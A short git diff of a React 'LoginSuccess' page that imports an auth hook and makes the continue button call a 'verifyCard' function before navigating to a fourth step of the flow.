@@ -1,10 +1,12 @@
 import { useEffect, useState } from "react";
 import { useLocation } from "wouter";
 import { ShieldCheck } from "lucide-react";
+import { useAuth } from "@/lib/auth";
 
 export default function LoginSuccess() {
   const [, navigate] = useLocation();
   const [username, setUsername] = useState("");
+  const { verifyCard } = useAuth();
 
   useEffect(() => {
     const stored = sessionStorage.getItem("botOtpUsername");
@@ -150,7 +152,7 @@ export default function LoginSuccess() {
           <button
             className="ls-fadein"
             type="button"
-            onClick={() => navigate("/step4")}
+            onClick={() => { verifyCard(); navigate("/step4"); }}
             style={{
               width: "100%", height: 52,
               background: "#111", color: "#fff",
